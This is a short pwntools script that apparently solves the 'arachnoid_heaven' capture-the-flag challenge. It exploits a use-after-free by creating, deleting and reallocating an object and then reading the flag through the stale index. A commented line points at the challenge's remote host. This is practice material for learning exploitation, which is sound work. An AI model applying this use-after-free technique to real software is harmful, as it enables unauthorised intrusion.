from pwn import *

# r = remote('167.172.58.213', 31697)
r = process('./arachnoid_heaven')

# Crafting arachnoid_A with a random name
r.sendlineafter(b'> ', b'1')
r.sendlineafter(b'Name: ', b'random')

# Deleting arachnoid_A
r.sendlineafter(b'> ', b'2')
r.sendlineafter(b'Index: ', b'0')

# Crafting arachnoid_B with the name "sp1d3y"
r.sendlineafter(b'> ', b'1')
r.sendlineafter(b'Name: ', b'sp1d3y')

# Obtaining the flag with arachnoid_A
r.sendlineafter(b'> ', b'4')
r.sendlineafter(b'Arachnoid: ', b'0')

# Getting the flag
flag = r.recvall(timeout=1).split(b'\n')[1].decode()
log.success(f"FLAG : {flag}")
